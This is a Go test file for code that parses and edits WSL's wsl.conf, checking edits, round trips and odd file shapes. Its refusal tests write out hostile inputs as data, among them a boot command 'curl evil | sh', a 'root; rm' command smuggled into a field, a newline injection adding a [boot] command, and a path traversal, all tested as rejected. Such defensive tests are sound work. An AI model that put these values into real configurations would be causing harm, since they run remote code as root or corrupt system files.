package desktop

import (
	"strings"
	"testing"
)

const confSample = `[boot]
systemd=true

[user]
default=goat

# Optional: remove windows from PATH (autocompletion)
[interop]
appendWindowsPath=false

[network]
generateResolvConf = false
`

func TestParseWSLConfOwnedKeysOnly(t *testing.T) {
	got := ParseWSLConf(confSample + "[custom]\nfoo=bar\n")
	want := []ConfValue{
		{"boot", "systemd", "true"},
		{"user", "default", "goat"},
		{"interop", "appendWindowsPath", "false"},
		{"network", "generateResolvConf", "false"},
	}
	if len(got) != len(want) {
		t.Fatalf("got %+v", got)
	}
	for i := range want {
		if got[i] != want[i] {
			t.Errorf("[%d] = %+v, want %+v", i, got[i], want[i])
		}
	}
}

// TestEditWSLConf is the decision table for a write:
//
//	key in file | new value | → result
//	yes         | set       | replaced in place, comments and other lines kept
//	yes         | empty     | line removed (WSL's default applies)
//	no, section | set       | appended after the section's last key
//	no section  | set       | new section at the end
//	same key name in another section | set | only the named section changes
func TestEditWSLConf(t *testing.T) {
	out, err := EditWSLConf(confSample+"[automount]\nenabled=true\n", []ConfEdit{
		{"interop", "appendWindowsPath", "true"},
		{"network", "generateResolvConf", ""},
		{"interop", "enabled", "false"},
		{"time", "useWindowsTimezone", "true"},
	})
	if err != nil {
		t.Fatal(err)
	}
	for _, must := range []string{
		"# Optional: remove windows from PATH (autocompletion)\n[interop]\nappendWindowsPath=true\nenabled=false\n",
		"appendWindowsPath=true\nenabled=false\n\n[automount]\nenabled=true\n",
		"\n[time]\nuseWindowsTimezone=true\n",
		"[boot]\nsystemd=true\n",
	} {
		if !strings.Contains(out, must) {
			t.Errorf("missing %q in:\n%s", must, out)
		}
	}
	if strings.Contains(out, "[network]") {
		t.Errorf("a section its edit emptied must go:\n%s", out)
	}
	if strings.Contains(out, "generateResolvConf") {
		t.Errorf("an emptied key must be removed:\n%s", out)
	}
	if strings.Count(out, "enabled=") != 2 {
		t.Errorf("[automount] enabled must be untouched by an [interop] edit:\n%s", out)
	}
}

func TestEditWSLConfRefuses(t *testing.T) {
	cases := []ConfEdit{
		{"boot", "command", "curl evil | sh"}, // read-only: a root command at boot
		{"boot", "systemd", "yes"},
		{"user", "default", "root; rm"},
		{"network", "hostname", "bad host"},
		{"automount", "root", "mnt"},
		{"automount", "options", "a\n[boot]\ncommand=x"},
		{"custom", "foo", "bar"},
	}
	for _, e := range cases {
		if _, err := EditWSLConf(confSample, []ConfEdit{e}); err == nil {
			t.Errorf("%+v was accepted", e)
		}
	}
}

func TestEditWSLConfEmptyFile(t *testing.T) {
	out, err := EditWSLConf("", []ConfEdit{{"boot", "systemd", "true"}})
	if err != nil || out != "[boot]\nsystemd=true\n" {
		t.Errorf("out = %q, err = %v", out, err)
	}
}

// TestSetThenRemoveRoundTrips: adding a key in a new section and removing it
// again gives back the original file byte for byte.
func TestSetThenRemoveRoundTrips(t *testing.T) {
	set, err := EditWSLConf(confSample, []ConfEdit{{"time", "useWindowsTimezone", "true"}})
	if err != nil {
		t.Fatal(err)
	}
	back, err := EditWSLConf(set, []ConfEdit{{"time", "useWindowsTimezone", ""}})
	if err != nil {
		t.Fatal(err)
	}
	if back != confSample {
		t.Errorf("round trip changed the file:\n%q\nwant\n%q", back, confSample)
	}
	// An empty section nobody edited is the person's and stays.
	keep, _ := EditWSLConf("[gpu]\n\n[boot]\nsystemd=true\n", []ConfEdit{{"boot", "systemd", "false"}})
	if !strings.Contains(keep, "[gpu]") {
		t.Errorf("an untouched empty section was dropped: %q", keep)
	}
}

// TestWSLConfFileShapes is the decision table for files as people write
// them — each row once damaged the file or hid a setting:
//
//	file shape                  | → behaviour
//	systemd=True                | read as "true" (the select shows on), untouched by other edits
//	BOM before [boot]           | same section, BOM kept
//	"[boot] # comment" header   | same section
//	CRLF line endings           | every line stays CRLF
//	[network] left empty by you | kept when an edit touches the section
func TestWSLConfFileShapes(t *testing.T) {
	vals := ParseWSLConf("[boot]\nsystemd=True\n")
	if len(vals) != 1 || vals[0].Value != "true" {
		t.Errorf("True: %+v", vals)
	}
	out, _ := EditWSLConf("[boot]\nsystemd=True\n[interop]\nenabled=true\n", []ConfEdit{{"interop", "enabled", "false"}})
	if !strings.Contains(out, "systemd=True") {
		t.Errorf("an unedited True was lost:\n%s", out)
	}

	bom := "\uFEFF[boot]\nsystemd=true\n"
	if v := ParseWSLConf(bom); len(v) != 1 {
		t.Errorf("BOM: %+v", v)
	}
	out, _ = EditWSLConf(bom, []ConfEdit{{"boot", "systemd", "false"}})
	if out != "\uFEFF[boot]\nsystemd=false\n" {
		t.Errorf("BOM edit = %q", out)
	}

	out, _ = EditWSLConf("[boot] # start-up\nsystemd=true\n", []ConfEdit{{"boot", "systemd", "false"}})
	if strings.Count(out, "[boot]") != 1 || !strings.Contains(out, "systemd=false") {
		t.Errorf("commented header split the section:\n%s", out)
	}

	out, _ = EditWSLConf("[boot]\r\nsystemd=true\r\n", []ConfEdit{{"boot", "systemd", "false"}, {"time", "useWindowsTimezone", "true"}})
	if strings.Contains(strings.ReplaceAll(out, "\r\n", ""), "\n") {
		t.Errorf("mixed line endings: %q", out)
	}

	out, _ = EditWSLConf("[network]\n\n[boot]\nsystemd=true\n", []ConfEdit{{"network", "hostname", "box"}})
	if !strings.Contains(out, "[network]\nhostname=box") {
		t.Errorf("hostname: %q", out)
	}
	out, _ = EditWSLConf("[network]\n[boot]\nsystemd=true\n", []ConfEdit{{"network", "hostname", ""}})
	if !strings.Contains(out, "[network]") {
		t.Errorf("a section you left empty was dropped: %q", out)
	}
}

func TestValidateConfRefusesDangerousValues(t *testing.T) {
	for _, e := range []ConfEdit{
		{"user", "default", "root"},
		{"automount", "options", `uid=0 "x"`},
		{"automount", "root", "/etc/ ;x"},
		{"automount", "root", "/mnt/../etc/"},
		{"automount", "root", "/mnt"},
	} {
		if err := ValidateConf(e); err == nil {
			t.Errorf("%+v accepted", e)
		}
	}
	for _, e := range []ConfEdit{
		{"automount", "options", "metadata,umask=22,fmask=11"},
		{"automount", "root", "/mnt/"},
		{"automount", "root", "/"},
	} {
		if err := ValidateConf(e); err != nil {
			t.Errorf("%+v refused: %v", e, err)
		}
	}
}
